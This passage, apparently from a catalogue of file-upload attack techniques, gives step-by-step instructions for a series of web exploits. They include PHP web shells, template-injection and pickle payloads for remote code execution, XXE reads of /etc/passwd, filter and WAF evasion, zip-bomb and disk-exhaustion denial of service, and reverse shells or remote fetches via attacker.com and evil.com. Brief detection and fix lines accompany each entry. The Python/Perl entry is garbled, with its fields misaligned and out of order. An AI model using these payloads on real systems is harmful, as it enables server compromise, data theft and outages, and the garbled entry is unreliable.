- **Impact**: Remote Code Execution (RCE), information disclosure
- **Tools**: Burp Suite, text editor, Jinja2 / Twig knowledge
- **Scenario**: Attackers upload a file containing template payloads (e.g., {{7*7}}) that get executed later when rendered (e.g., invoice, resume, HTML generation).
- **Attack Steps**: Step 1: Create a text-based file such as .html, .md, or .txt. Inside the file, insert a payload such as {{7*7}} or a dangerous one like {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}. Step 2: Upload the file to the web app through any field where file content might be processed later (e.g., invoice templates, resume viewers, document parsers). Step 3: Wait for the app to render the file’s contents — either on a user profile, admin dashboard, or email. Step 4: If the backend uses a vulnerable template engine (like Jinja2) and fails to escape variables, the payload will be interpreted as code. Step 5: For example, {{7*7}} will display 49, or {{os.system('id')}} may leak server info. Step 6: This confirms stored SSTI. You didn’t need to trigger it — the backend rendered and executed it. Step 7: This technique is silent and persists until rendering occurs.
- **Detection**: Check rendered pages for unexpected execution results
- **Solution**: Always escape template variables; never render untrusted input directly in templates
- **Tags**: Jinja2, Stored SSTI, Template Injection

## Base64/Hex Encoded File to Bypass Filters

- **Attack Type**: Filter Evasion via Encoded Payload
- **Target**: Upload parsers, middleware, API decode endpoints
- **Vulnerability**: File type filtering done only by extension or surface check
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: RCE, filter bypass, persistent malware
- **Tools**: Burp Suite, base64 encoder, PHP decoder
- **Scenario**: Some apps block .php, .jsp, or .exe directly. Attackers encode payloads (base64, hex) and rely on the server to decode before executing or storing the file.
- **Attack Steps**: Step 1: Create a normal malicious file (e.g., <?php system($_GET['cmd']); ?>) and save it as shell.php. Step 2: Base64 encode the entire file. Use a site like base64encode.org or Python: base64.b64encode(open('shell.php','rb').read()). Step 3: Upload the encoded content either as a text file (e.g., payload.txt) or in a parameter if the app accepts raw file contents. Step 4: If the server decodes and writes the content to disk (e.g., writes decoded output to a .php file), the file becomes executable. Step 5: Try to access the decoded file directly if you know the storage path. Step 6: Alternatively, trigger a decoding function by submitting a request that instructs the server to decode and save (e.g., decode=1). Step 7: Once decoded, visit http://target/uploads/shell.php?cmd=whoami. Step 8: If successful, this bypassed file type restrictions using encoded delivery.
- **Detection**: Monitor for encoded payloads in logs, parameters or text uploads
- **Solution**: Don’t decode user uploads server-side; validate content by type + scan decoded output
- **Tags**: Base64 Upload, MIME Bypass, Filter Evasion

## Malicious PDF with JavaScript or Shellcode

- **Attack Type**: PDF Exploit via Embedded Code
- **Target**: HR Portals, Preview Tools, Adobe Readers
- **Vulnerability**: Executable content in uploaded documents
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: RCE, shell access, user compromise
- **Tools**: Burp Suite, PDF Toolkit, MSFVenom, Evince
- **Scenario**: Attackers upload PDF files with embedded JavaScript or shellcode; if opened by staff or server automation, the code may execute silently.
- **Attack Steps**: Step 1: Use a tool like msfvenom or Metasploit Framework to craft a malicious PDF with embedded JavaScript. Example: msfvenom -p windows/meterpreter/reverse_tcp -f exe > payload.exe, then embed into PDF using PDF Toolkit or Metasploit. Step 2: Alternatively, open Adobe Acrobat, go to Tools > JavaScript > Document JavaScripts, and insert: app.alert('Hacked!'); or this.exportDataObject({cName:'cmd.exe', nLaunch:2});. Step 3: Save the file as offer_letter.pdf. Step 4: Upload it through resume, invoice, or report sections. Step 5: Wait for admin or backend automation to open the PDF. Step 6: If JavaScript is executed or shellcode is loaded (e.g., reverse shell), you’ve achieved code execution. Step 7: This is highly stealthy and relies on the backend or user clicking the file. Step 8: Use email spoofing or social engineering to improve success rate.
- **Detection**: Monitor PDF uploads for embedded JS; isolate preview machines
- **Solution**: Block JavaScript in PDFs, use safe PDF viewers with sandboxing
- **Tags**: Malicious PDF, Embedded JS, Shellcode

## SVG Upload with Embedded JavaScript or XXE

- **Attack Type**: Script Execution via SVG/XML Injection
- **Target**: Image processors, web UIs that inline-render SVG
- **Vulnerability**: Unrestricted inline rendering of untrusted SVG/XML
- **MITRE**: T1220 – XSS, T1221 – XXE
- **Impact**: XSS, file read, SSRF, stored exploit
- **Tools**: Burp Suite, SVG editor, XXE payload
- **Scenario**: SVG (image) files support embedded JS and external entities. If rendered inline, attackers can execute scripts or trigger XXE (file read).
- **Attack Steps**: Step 1: Create a basic SVG file (open in notepad): <svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS');</script></svg>. Step 2: For XXE, use this content instead: <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>. Step 3: Save as evil.svg. Step 4: Upload via any image upload field (e.g., avatar, product images). Step 5: If the server displays SVG inline (not as a downloadable file), the JS runs or the external entity loads. Step 6: For XXE, the server may replace &xxe; with the contents of /etc/passwd if XML parser is vulnerable. Step 7: Use this to exfiltrate config files, credentials, or execute chained SSRF payloads. Step 8: SVG is especially dangerous because it passes image file checks but allows full scripting. Step 9: If successful, you now have either XSS or file read/RCE.
- **Detection**: Look for SVG content rendered inline, or XML entities in logs
- **Solution**: Sanitize SVGs; don’t render inline; disable DTD/entity parsing in XML parsers
- **Tags**: SVG Upload, XXE, JavaScript in Image, RCE

## Serialized Object Upload (Pickle, Java, Node.js)

- **Attack Type**: Deserialization Exploit via File Upload
- **Target**: Backend systems accepting structured objects
- **Vulnerability**: Insecure deserialization of untrusted objects
- **MITRE**: T1059 / T1203 – Code Execution via App Logic
- **Impact**: Remote code execution, backend takeover
- **Tools**: Python, ysoserial, Burp Suite, NodeSerial
- **Scenario**: Attackers upload serialized objects (e.g., .pkl, .ser, .json) that trigger remote code execution (RCE) when the backend deserializes them without validation.
- **Attack Steps**: Step 1: Create a malicious serialized file using a tool like pickle in Python or ysoserial for Java. For example, in Python: import pickle, os; payload = pickle.dumps(lambda: os.system("id")); — then save to exploit.pkl. Step 2: Upload the file through a function that allows model, settings, or data uploads. These are often seen in AI, admin dashboards, or internal tools. Step 3: Wait for the backend to deserialize the file — often automatically triggered during a “load” action. Step 4: If the backend doesn’t validate the object type or sanitize the deserialization step, your payload will be executed as code. Step 5: Confirm success by checking if the payload command ran (e.g., file created, whoami returned). Step 6: You can escalate this with reverse shell or local privilege escalation once code execution is achieved. Step 7: This attack doesn’t require any interaction if automatic parsing is enabled. Step 8: Java and Node.js deserialization also works with .ser, .json, or binary blobs, depending on backend stack. Step 9: Highly effective if server trusts uploaded objects blindly.
- **Detection**: Analyze deserialization logs, use sandboxed object parsing
- **Solution**: Reject serialized objects from untrusted users; enforce strict input type & digital signing before processing
- **Tags**: Deserialization, Pickle, Java Gadget Upload

## Template Injection in File Name (Rendered Later)

- **Attack Type**: Stored SSTI via Filename
- **Target**: Platforms that render filenames (dashboard, mail)
- **Vulnerability**: Filename not sanitized before template rendering
- **MITRE**: T1059 – Template Injection
- **Impact**: RCE, sensitive file access, stored code execution
- **Tools**: Burp Suite, Flask/Jinja2 knowledge
- **Scenario**: Some platforms render filenames in templates (e.g., email, dashboards). If you upload a file with a template payload in the name, it may be executed when rendered.
- **Attack Steps**: Step 1: Rename a file to something like {{7*7}}.jpg or {{config.__class__.__init__.__globals__['os'].popen('id').read()}}.jpg. Step 2: Upload the file using any basic file upload feature (e.g., avatar, attachment, support documents). Step 3: Wait for the filename to appear on pages like “View Uploaded Documents,” email templates, or admin dashboards. Step 4: If the template engine renders the filename (instead of escaping it), the code inside will execute. Step 5: You may see a number like 49 (7*7), which confirms the SSTI. Step 6: For more advanced payloads, try command injection — if successful, you’ll see system responses or get reverse shell access. Step 7: This is often ignored because the filename looks harmless and is not inspected. Step 8: You can chain this with file upload RCEs for maximum impact. Step 9: Works especially well on Flask (Jinja2), Twig, or Django templates if not sanitized properly.
- **Detection**: Log review for odd filenames, escaped template rendering
- **Solution**: Always escape filenames before rendering; use safe filename display mechanisms
- **Tags**: Filename SSTI, Template RCE, Dashboard Exploit

## Log Poisoning for RCE via Template Rendering

- **Attack Type**: Template Injection via Logs
- **Target**: Admin dashboards, log viewers, APM tools
- **Vulnerability**: Logs rendered without sanitization
- **MITRE**: T1203 – Exploitation for RCE via App Logic
- **Impact**: RCE, log manipulation, persistent access
- **Tools**: Burp Suite, User-Agent Modifier, curl
- **Scenario**: Attackers poison logs with payloads (e.g., in User-Agent) that later get rendered in admin dashboards or log viewers, triggering template execution.
- **Attack Steps**: Step 1: Use any HTTP client (e.g., curl, Burp) to send a request to the web server with a crafted User-Agent like: curl -H "User-Agent: {{7*7}}" http://target.com. Step 2: The server logs this User-Agent string into its access/error logs (e.g., /var/log/nginx/access.log). Step 3: If a developer or admin opens a log viewer that uses a template engine to render log entries without escaping (e.g., Flask+Jinja2 or Django templates), the {{7*7}} will be executed. Step 4: You’ll see 49 or other confirmation in the interface. Step 5: Replace the payload with something like {{config.__class__.__init__.__globals__['os'].system('whoami')}} for real code execution. Step 6: This payload can even create reverse shells if the logs are rendered by cron jobs, dashboards, or alerting systems. Step 7: You don’t need to upload files or bypass WAF — you just wait for your poisoned payload to be rendered. Step 8: This attack works silently and can persist in logs for weeks until someone views them.
- **Detection**: Monitor for template expressions in logs, anomalous viewer output
- **Solution**: Escape log content before rendering; never trust client-supplied metadata
- **Tags**: Log Injection, Template RCE, Silent Payload

## WAF/Antivirus Evasion using Obfuscated Payloads

- **Attack Type**: Payload Evasion via Encoding/Obfuscation
- **Target**: WAF-protected upload forms or AV-monitored servers
- **Vulnerability**: Poor WAF/AV parsing logic, weak blacklist rules
- **MITRE**: T1203 – Execution via Filter Evasion
- **Impact**: Upload shell bypassing filters, stealth persistence
- **Tools**: Burp Suite, Unicode tools, payload encoder
- **Scenario**: WAFs or AV engines often use simple regex rules. Attackers upload obfuscated or encoded versions of payloads to bypass these filters.
- **Attack Steps**: Step 1: Take a known payload (e.g., <?php system($_GET['cmd']); ?>) and obfuscate it using techniques like breaking characters (<?php/**/system($_GET['cmd']); ?>) or using base64: eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')). Step 2: Rename file with double extensions: shell.php.jpg or shell.php%20.jpg (adds whitespace) or UTF-8 encoded shell.php%C0%AEjpg. Step 3: Upload it to a form that blocks .php but allows .jpg. Step 4: If the WAF only checks extensions or blocks certain strings, it may fail to detect obfuscated code. Step 5: Visit the uploaded file or trigger its execution using a crafted request. Step 6: If obfuscation worked, code executes. Step 7: You can also use encoding techniques (UTF-16, mixed casing like PhP, null bytes like shell.php%00.jpg) to bypass checks. Step 8: Test these bypasses until one succeeds. Step 9: Combine with other payloads like SSTI or LFI for full control.
- **Detection**: Compare file behavior vs. filename and MIME type
- **Solution**: Use strict content filtering; decode and scan payloads; avoid relying solely on extensions
- **Tags**: WAF Bypass, AV Evasion, Payload Obfuscation

## Double Extension Trick with Whitespace or UTF-8

- **Attack Type**: Upload Bypass via Extension Tricks
- **Target**: File upload fields with poor extension validation
- **Vulnerability**: Only checking file suffix, not full filetype/MIME
- **MITRE**: T1203 – Execution via Filename Evasion
- **Impact**: Upload shell accepted despite filtering
- **Tools**: Burp Suite, curl, Unicode/hex encoders
- **Scenario**: Servers that validate file extensions may be tricked using double extensions, whitespaces, or UTF-8 encoded characters.
- **Attack Steps**: Step 1: Create a malicious file: shell.php containing <?php system($_GET['cmd']); ?>. Step 2: Rename the file as shell.php.jpg — or more stealthy: shell.php .jpg (with space), shell.php%20.jpg, or shell.php%00.jpg. Step 3: Upload it to a form that allows .jpg or .png files. Step 4: If server-side validation only checks the last part of the filename or uses weak regex, it may allow the file. Step 5: Visit the file at http://target/uploads/shell.php.jpg. Step 6: If the server executes it (e.g., Apache with mod_php), you now have RCE. Step 7: You can also use Unicode tricks: shell.php%C0%AEjpg or shell.phP. Step 8: These tricks work on misconfigured Linux/Windows servers where filename parsing isn’t normalized. Step 9: Use Burp Repeater or Postman to manipulate the upload payloads for best testing control.
- **Detection**: Compare real file MIME vs. filename extension
- **Solution**: Validate MIME type and magic bytes; block double extensions or rename uploaded files
- **Tags**: Double Extension, Filename Trick, MIME Evasion

## Upload Hidden File with . (dot) Prefix or UTF Filename

- **Attack Type**: Hidden File Upload
- **Target**: Linux-based web servers
- **Vulnerability**: Hidden dot files, Unicode reverse extension trick
- **MITRE**: T1203 – Execution via Filename Evasion
- **Impact**: Stealth webshell upload, persistence, hidden payload
- **Tools**: Burp Suite, curl, Postman, Unicode Encoders
- **Scenario**: Attackers upload a file starting with a dot (e.g., .htaccess, .php) or with special Unicode characters to bypass visibility and validation checks.
- **Attack Steps**: Step 1: Create a payload like <?php system($_GET['cmd']); ?> and save it as .shell.php or use Unicode like U+202E (right-to-left override): php.1gpj. Step 2: Upload the file via any standard file upload feature. Some systems may ignore or skip processing dot-prefixed files or those with unusual encodings. Step 3: If the file is uploaded successfully, it may remain hidden from directory listings or admin dashboards. Step 4: Manually access the file by guessing or brute-forcing the upload URL (e.g., /uploads/.shell.php or /uploads/1gpj.php). Step 5: If the server is misconfigured to execute files based on internal MIME type or filename, the code will run. Step 6: This bypass is effective on Linux/Unix systems that hide dotfiles by default and can be combined with encoding tricks for WAF evasion. Step 7: Use this to achieve stealth shell access or persistence after initial exploitation.
- **Detection**: Monitor hidden directories, detect abnormal filename encodings
- **Solution**: Block dot-prefixed uploads and normalize filenames before storage
- **Tags**: Dotfiles, UTF Filename, Hidden Upload

## Upload with Fake Image Headers (Magic Bytes Spoofing)

- **Attack Type**: MIME-Type Evasion via Magic Bytes
- **Target**: Apache, Nginx servers
- **Vulnerability**: Weak content validation, header-based filtering
- **MITRE**: T1203 – Execution via MIME Spoofing
- **Impact**: Remote shell, full command execution
- **Tools**: Hex Editor, Burp Suite, file command (Linux)
- **Scenario**: Some file upload filters check only file headers (magic bytes) for validation. Attackers spoof headers to make a malicious file appear as an image or document.
- **Attack Steps**: Step 1: Open your malicious file (e.g., shell.php) in a hex editor. Step 2: Add image magic bytes at the start — for JPEG: FF D8 FF E0 00 10 4A 46 49 46 00. Leave the PHP code after the header. Step 3: Save the file as shell.jpg or img.php.jpg. Step 4: Upload the file through a form that validates files based on MIME headers. Step 5: The upload logic might see the image header and allow it, assuming it’s a real image. Step 6: Once uploaded, access the file directly (e.g., /uploads/shell.jpg) — if Apache (mod_php) or PHP-FPM is used, the PHP code may still execute despite image header. Step 7: You can verify this by passing ?cmd=id in the query. Step 8: This trick bypasses both client-side and server-side content inspection when poorly implemented. Step 9: Works best on older or misconfigured PHP servers.
- **Detection**: Compare real content (magic bytes) with extension and MIME
- **Solution**: Scan full file content, verify extensions and restrict mixed-content files
- **Tags**: Magic Bytes, MIME Evasion, PHP Injection

## Remote File Inclusion (RFI) via URL Parameters

- **Attack Type**: RFI via File Upload or URL Path
- **Target**: PHP-based apps using include()
- **Vulnerability**: Insecure URL inclusion (allow_url_include=On)
- **MITRE**: T1203 – Remote File Inclusion
- **Impact**: Full code execution via external files
- **Tools**: Ngrok, Burp Suite, Web server (for hosting .php)
- **Scenario**: Attackers use URL-based file inclusion to point the app to remote malicious scripts (e.g., .php) hosted elsewhere and executed on the server.
- **Attack Steps**: Step 1: Set up a public server or use ngrok to expose a local .php shell (e.g., shell.php) on the internet. Example: http://evil.com/shell.txt. Step 2: Find a parameter that loads files by URL, like index.php?page=home, ?lang=, or ?template=. Step 3: Replace the parameter value with your hosted file URL (e.g., index.php?page=http://evil.com/shell.txt). Step 4: If remote file inclusion is enabled (allow_url_include=On in PHP), your payload will be fetched and executed as part of the app logic. Step 5: Your PHP payload may contain commands like system("id") or backdoors. Step 6: You can gain access to the server shell via query parameters like ?cmd=whoami. Step 7: Monitor the request logs to confirm execution. Step 8: Combine with proxy tunneling or serverless hosting for stealth. Step 9: Can be weaponized in phishing, defacement, or full RCE.
- **Detection**: Monitor external calls, whitelist internal includes
- **Solution**: Disable allow_url_include; validate URL sources and use strict include paths
- **Tags**: RFI, Remote Include, PHP Include Abuse

## Local File Inclusion (LFI) via Uploaded Payloads

- **Attack Type**: LFI to RCE via Uploads
- **Target**: PHP/Apache servers with LFI
- **Vulnerability**: Local file inclusion with writable upload directory
- **MITRE**: T1059 – Execution via File Path Traversal
- **Impact**: File upload → code execution chain
- **Tools**: Burp Suite, curl, File upload tool
- **Scenario**: Attackers upload a malicious file and then exploit an LFI bug in the application to include and execute it (e.g., via traversal or known path).
- **Attack Steps**: Step 1: Upload a file containing PHP payload (e.g., <?php system($_GET['cmd']); ?>) using a feature like avatar, resume upload, or support docs. Save the file as cmd.php or resume.txt. Step 2: Identify an LFI vulnerability in the web app — for example: index.php?page=../../uploads/cmd.php. Step 3: Use traversal (../) or known upload paths to point the vulnerable parameter to your uploaded file. Step 4: Access the file via the LFI vector with a command, such as ?cmd=id. Step 5: If the inclusion works and the server executes PHP files from that path, the command is executed. Step 6: Confirm success by observing command output. Step 7: Combine this with log poisoning (uploading to access logs) if you can’t directly upload .php files. Step 8: LFI → RCE works even on hardened apps if uploads land in executable directories. Step 9: Use this method to pivot to reverse shell or local privilege escalation.
- **Detection**: Monitor for ../ or absolute path parameters
- **Solution**: Disable PHP execution in upload folders; use strict file path filters
- **Tags**: LFI, Upload to RCE, Path Traversal

## Upload Large File for Disk Exhaustion (DoS)

- **Attack Type**: Denial of Service via Resource Exhaustion
- **Target**: File-upload enabled web apps
- **Vulnerability**: No upload size limit or disk quota
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Full disk → server crash or application denial
- **Tools**: dd (Linux), Burp Suite, curl
- **Scenario**: Attacker uploads a very large file (e.g., 5GB–20GB) to a web app to exhaust server disk space, triggering a denial of service or application crash.
- **Attack Steps**: Step 1: Use a tool like dd to create a large dummy file: dd if=/dev/zero of=bigfile.mp4 bs=10M count=1024 (creates a 10GB file). Step 2: Open the target app's upload feature (e.g., profile picture, video resume, document uploader). Step 3: Begin uploading the file using the form or with a tool like Burp Suite or curl. Step 4: If the application doesn’t have size limits or streaming controls, it will start storing the file on disk. Step 5: Re-upload multiple copies of the file or open several browser tabs or curl sessions to upload in parallel. Step 6: Monitor the server’s disk usage (if you have access or via DoS indicators like timeout or 500 errors). Step 7: Eventually, the disk gets full, logging fails, and uploads crash or block access to other users. Step 8: This can crash services, stop database writes, or even reboot VMs depending on setup. Step 9: Easy DoS vector for shared hosting, poorly isolated tenants, or serverless with storage limits.
- **Detection**: Monitor upload sizes, alert on disk threshold crossing
- **Solution**: Enforce strict file size limits; monitor temp directories; use cloud-based object storage with quotas
- **Tags**: DoS, File Upload, Resource Exhaustion

## Upload Zip Bomb for Decompression Bomb DoS

- **Attack Type**: DoS via Zip Bomb or Archive Decompression
- **Target**: File-processing backend servers
- **Vulnerability**: Unchecked archive extraction logic
- **MITRE**: T1499 – Resource Exhaustion DoS
- **Impact**: Server hangs, timeout, storage/memory crash
- **Tools**: zipbomb.py, zipslip.py, 42.zip, fuzzer
- **Scenario**: Attacker uploads a compressed archive (e.g., .zip) that expands to hundreds of GBs or millions of nested files, exhausting server memory and CPU.
- **Attack Steps**: Step 1: Generate a zip bomb using tools like zipbomb.py or download classic bombs like 42.zip. These files appear small (e.g., 50 KB) but expand to over 4–5 GB. Step 2: Open the upload form that allows .zip, .rar, or .tar.gz files. Step 3: Upload the zip bomb using the web form or with curl/Postman. Step 4: If the backend automatically extracts the uploaded archive, it will start decompressing the file. Step 5: The zip bomb will inflate recursively, creating either millions of tiny files or massive uncompressed files. Step 6: This overwhelms server memory, disk, or CPU — often causing timeouts, slowdowns, or full DoS. Step 7: The server may reboot or log errors like "Too many open files" or "Out of memory". Step 8: Repeat the attack for persistence or to force a reboot window. Step 9: Works best against archive extraction logic that doesn't enforce depth or size limits.
- **Detection**: Monitor archive extraction logs, file depth and file count
- **Solution**: Restrict archive types, limit decompression depth/filesize, use antivirus scanners
- **Tags**: Zip Bomb, Upload DoS, Archive Exploit

## SSRF via Uploaded XML or SVG Payloads

- **Attack Type**: SSRF via Malicious File Upload
- **Target**: Apps parsing uploaded SVG/XML
- **Vulnerability**: SVG/XML parsed with no external fetch restrictions
- **MITRE**: T1213 – SSRF via Uploaded Payload
- **Impact**: Internal service discovery, SSRF → privilege escalation
- **Tools**: Burp Suite, SVG/XXE Generator, Interactsh
- **Scenario**: Attacker uploads an SVG or XML file containing SSRF payload (e.g., external entities, URLs) that triggers server-side request when parsed.
- **Attack Steps**: Step 1: Create an SVG or XML file with external entity payloads. Example for SVG: <image xlink:href="http://attacker.com/leak"/>. For XML: define <!ENTITY xxe SYSTEM "http://attacker.com/internal">. Step 2: Save the file with .svg or .xml extension. Step 3: Upload it via a feature that stores user files or displays them — e.g., image preview, chart upload, or avatar feature. Step 4: The server parses the uploaded file to render or validate it. During this parsing, the malicious external link is triggered. Step 5: This can lead to the server making HTTP or DNS requests to internal or attacker-controlled systems (SSRF). Step 6: Use Interactsh or Burp Collaborator to confirm the request came from the victim server. Step 7: If the endpoint allows file fetches (like image proxies or PDF converters), this may expose internal network or cloud metadata endpoints. Step 8: With enough chaining, it can escalate to RCE or full internal reconnaissance. Step 9: This is also known as SVG SSRF or Blind SSRF via XML file.
- **Detection**: Monitor DNS/HTTP outbound calls on file render paths
- **Solution**: Disable external DTDs in XML parsers, sanitize SVG/XXE, enforce file content validation
- **Tags**: SVG SSRF, XXE via Upload, Blind SSRF

## Path Traversal via Encoded Payloads (..%2f..)

- **Attack Type**: Directory Traversal via Encoded Characters
- **Target**: PHP/Nginx/Apache apps with upload
- **Vulnerability**: File path not normalized, encoded traversal bypass
- **MITRE**: T1006 – Path Traversal via Encoding
- **Impact**: Write file anywhere on disk, gain shell/RCE
- **Tools**: Burp Suite, curl, URL Encoder/Decoder Tools
- **Scenario**: Attackers upload files with encoded traversal characters (e.g., %2e%2e/) to escape allowed directories and write malicious files outside permitted areas.
- **Attack Steps**: Step 1: Create a PHP payload or webshell file (e.g., <?php system($_GET['cmd']); ?>) and name it as shell.php. Step 2: Find a vulnerable upload parameter like POST /upload?path=uploads/. Step 3: Change the path parameter to use encoded traversal characters, like: uploads/%2e%2e/%2e%2e/tmp/ → which decodes to ../../tmp/. Step 4: Use Burp Suite or curl to intercept and modify the request. Step 5: The file will be uploaded into /tmp/ or even /var/www/html/, depending on how the path is constructed in the backend. Step 6: Once uploaded, access it directly at the guessed location (e.g., http://target.com/tmp/shell.php). Step 7: If successful, your malicious file executes with web server privileges. Step 8: This is often overlooked by developers who only filter ../ but not encoded forms (%2e%2e/, %252e%252e/). Step 9: Combine with chained upload + path control to escalate to full RCE.
- **Detection**: Detect encoded traversal characters in parameters
- **Solution**: Normalize upload paths before write; restrict writable dirs; reject encoded traversal in input
- **Tags**: Path Traversal, Encoded Bypass, File Write Abuse

## Python/Perl File Upload with Unsafe Evaluation

- **Attack Type**: File Upload + Unsafe Script Execution
- **Target**: bash'); for Perl, use: system("nc attacker.com 4444 -e /bin/bash");. This will trigger a reverse shell or system command execution when evaluated. **Step 4:** Save your payload as evil.pyorevil.pland upload it via the form. Ensure your attacker machine is ready to catch the connection. For example, if using Netcat, runnc -lvnp 4444on your local system. **Step 5:** Once the file is uploaded, the vulnerable application will process and execute it using something like Python’seval(open(filename).read())or Perl’sdo filename.pl. Since no input validation or sandboxing is in place, your system command executes with the web server’s privileges. **Step 6:** On your attacker machine, you should now get a reverse shell. If not, try alternative payloads such as writing files to the server (echo hacked > /tmp/pwned.txt`) to test if commands are executed. Step 7: After successful code execution, you can escalate further by exploring environment variables, file systems, or even dropping persistence scripts. Step 8: You may also use the same vector to exfiltrate data, download more tools, or pivot to internal services. Step 9: To maintain stealth, rename uploaded scripts to appear legitimate or insert payloads within benign-looking functions. Step 10: Defenders can only detect this if file execution is logged, or if suspicious outbound connections are monitored — which is rare in dev/test environments.
- **Vulnerability**: Web Servers, Dev Tools
- **MITRE**: Insecure code evaluation of user-uploaded scripts
- **Impact**: T1059 – Command and Scripting Interpreter
- **Tools**: Burp Suite, curl, Netcat, Python/Perl CLI
- **Scenario**: Web apps that let users upload code files and dangerously execute them with Python's eval() or Perl’s do/system() functions can be exploited for full server access.
- **Attack Steps**: Step 1: Find a web application feature that allows users to upload script files, such as .py or .pl. Common use cases include online code runners, compilers, or sandbox testing platforms. Often the upload field is labeled something like “Upload Code” or “Submit Script.” Step 2: Capture the upload request using Burp Suite. Verify that your uploaded file reaches the server and is processed — this usually happens if the app shows execution results or output after upload. Step 3: Craft a malicious payload depending on the backend language: for Python, create a .py file containing: `import('os').system('curl http://attacker.com/shell.sh
- **Detection**: Full Remote Code Execution, Privilege Escalation
- **Solution**: Monitor for script uploads, detect unusual reverse shells, analyze runtime logs, and alert on use of eval/system functions
- **Tags**: Never use eval() or do on untrusted content; sandbox code execution using containers or serverless environments

## Directory Traversal via Filename Injection

- **Attack Type**: Directory Traversal via Malicious Filename
- **Target**: PHP, Apache, NodeJS servers
- **Vulnerability**: Filename used directly without sanitization
- **MITRE**: T1006 – Path Traversal
- **Impact**: Arbitrary file write, potential RCE
- **Tools**: Burp Suite, curl, Intercepting Proxy
- **Scenario**: Attacker uploads a file with a filename like ../../shell.php to trick the server into saving it outside of the intended upload directory.
- **Attack Steps**: Step 1: Prepare a malicious file, such as a simple web shell (<?php system($_GET['cmd']); ?>) and name it ../../shell.php. Step 2: Upload it through a form that allows custom filenames or doesn't sanitize uploaded file names. Step 3: Use Burp Suite to intercept the upload request and ensure the filename remains ../../shell.php. Step 4: When the server saves the file, it may write it into a higher directory like /var/www/html/, depending on how the server handles file paths. Step 5: Now, access the file directly via browser: http://target.com/shell.php. Step 6: If the server failed to sanitize the file path, the payload is now active and can execute commands. Step 7: This method is especially dangerous when paired with upload folders that aren’t locked down. Step 8: You can now run commands like ?cmd=id or upload a reverse shell to gain further access. Step 9: Works against systems using user-provided filenames directly without path sanitization.
- **Detection**: Monitor uploaded filenames for path characters (../)
- **Solution**: Strip ../ or any special path characters from file names; store uploads with randomized internal names
- **Tags**: Path Traversal, Filename Injection, File Write Exploit

## HTML Injection via File Upload Display (HTML in Filename)

- **Attack Type**: HTML Injection via Uploaded Filename Display
- **Target**: Admin dashboards, CMS, portals
- **Vulnerability**: No HTML encoding on user-controlled file names
- **MITRE**: T1059 – Command Execution via XSS
- **Impact**: Stored HTML/XSS injection, admin takeover
- **Tools**: Burp Suite, curl, Upload forms
- **Scenario**: When an app reflects the uploaded file’s name without escaping HTML characters, attackers can inject HTML/JS that executes in the admin or user browser.
- **Attack Steps**: Step 1: Rename any file (e.g., text file) to a name like <h1>Hacked!</h1>.txt or <script>alert(1)</script>.jpg. Step 2: Upload the file through the app’s file upload interface. Step 3: Observe how the file name is displayed in the file list, dashboard, or logs. Step 4: If the web page does not sanitize file names using HTML escaping, then your HTML or script tag is rendered as-is. Step 5: The script or tag executes immediately in the browser of the admin, staff, or user who views it. Step 6: This is a form of stored HTML injection or stored XSS. Step 7: Common on apps where file upload logs or preview pages display file names directly in raw HTML. Step 8: You can escalate to session hijacking or cookie theft using <img src=x onerror=...> type payloads. Step 9: Always confirm with browser dev tools or network panel to see script firing.
- **Detection**: Analyze HTML content in logs, UI rendering of file names
- **Solution**: Always HTML-escape filename before displaying on frontend
- **Tags**: HTML Injection, File Upload, Stored XSS

## XSS via File Upload in Avatar or Filename

- **Attack Type**: Stored Cross-Site Scripting via Upload Field
- **Target**: File viewers, dashboards, chat apps
- **Vulnerability**: Stored XSS via filename or metadata
- **MITRE**: T1059.007 – XSS via Content Injection
- **Impact**: Stored XSS → user/admin account hijack
- **Tools**: Burp Suite, EXIFTool, browser dev tools
- **Scenario**: Attackers embed XSS payloads in the filename or file metadata (EXIF, ID3) that execute when an admin or user views the uploaded content in browser.
- **Attack Steps**: Step 1: Rename an image file to something like <svg/onload=alert(1)>.jpg or use exiftool to edit EXIF metadata (e.g., Author: <script>alert('xss')</script>). Step 2: Upload this image to a web app that supports profile pictures, avatars, document upload, etc. Step 3: Visit the area of the app that displays uploaded content (e.g., dashboard, preview page). Step 4: If the filename or metadata is inserted directly into the HTML without escaping, it will execute in the browser. Step 5: The script may run in admin’s session — leading to account hijacking, token theft, etc. Step 6: Works even when JavaScript is injected in alt text, title, or metadata. Step 7: Check browser developer tools to confirm DOM-level script injection. Step 8: You can extend this to steal cookies, perform CSRF, or load malicious JS files. Step 9: This method is effective against file preview features that show metadata or file info without sanitation.
- **Detection**: Scan uploaded filenames/metadata for scripts or tags
- **Solution**: Sanitize all file metadata and filenames before display; use Content Security Policy
- **Tags**: XSS, Stored Payload, Upload Injection

## Dangerous File Handling in File Preview Feature

- **Attack Type**: File Preview Rendering Attack
- **Target**: HR portals, job systems, CMS preview
- **Vulnerability**: Unfiltered file preview rendering
- **MITRE**: T1203 – Execution via File Viewer
- **Impact**: Client-side JS execution, phishing, session theft
- **Tools**: HTML editors, Burp Suite, PDF payload builders
- **Scenario**: Some apps render previews of uploaded files (HTML, PDF, RTF). Attackers upload malicious content that executes in iframe or server-side preview, leading to XSS or RCE.
- **Attack Steps**: Step 1: Create a malicious HTML file with payload like <script>alert('Preview')</script> or <iframe src="http://evil.com/steal"></iframe>. Step 2: Upload it as a resume, document, or site preview (e.g., resume.html). Step 3: Access the preview feature, or wait for a staff/admin to open the file preview. Step 4: If the app renders the HTML or PDF content directly into an iframe or inline, the script will run. Step 5: This results in Stored XSS or file-based JS execution inside the browser. Step 6: For PDFs, embed JS using tools like PDF Toolkit or pdf.js and upload the malicious file. Step 7: The script can steal cookies, open popups, redirect users, or log keystrokes. Step 8: Confirm execution via browser dev tools or use external logging services. Step 9: This vulnerability is common in HR systems, job portals, or CMS that preview user-uploaded files.
- **Detection**: Check if preview content is sandboxed or scriptable
- **Solution**: Use sandboxed iframe (sandbox="allow-same-origin") or convert to safe formats like PNG before preview
- **Tags**: Preview XSS, HTML Injection, Document-Based Exploit

## Executable .phar File Upload (PHP Archives with Metadata RCE)

- **Attack Type**: Code Execution via PHAR Deserialization
- **Target**: PHP servers using file checks
